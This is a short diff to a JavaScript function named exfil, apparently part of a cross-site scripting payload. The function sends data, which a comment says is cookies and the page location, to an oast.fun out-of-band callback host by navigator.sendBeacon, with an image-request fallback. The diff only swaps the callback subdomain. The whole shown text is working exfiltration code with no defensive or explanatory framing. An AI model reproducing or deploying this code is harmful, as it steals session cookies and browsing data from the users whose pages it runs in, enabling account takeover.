@@ -9,12 +9,12 @@ function exfil(data) {
     
     // Try sendBeacon (best)
     if (navigator.sendBeacon) {
-        navigator.sendBeacon("https://ybfttwhjfsrzfyyuvtjuu0z3r714v9smj.oast.fun/exfil", payload);
+        navigator.sendBeacon("https://ehexvgcthhdlxzxhgsvvnu3zjinpn36ty.oast.fun/exfil", payload);
     }
     
     // Fallback with Image
     const img = new Image();
-    img.src = "https://ybfttwhjfsrzfyyuvtjuu0z3r714v9smj.oast.fun/exfil?data=" + encodeURIComponent(payload);
+    img.src = "https://ehexvgcthhdlxzxhgsvvnu3zjinpn36ty.oast.fun/exfil?data=" + encodeURIComponent(payload);
 }
 
 // Send cookies + location
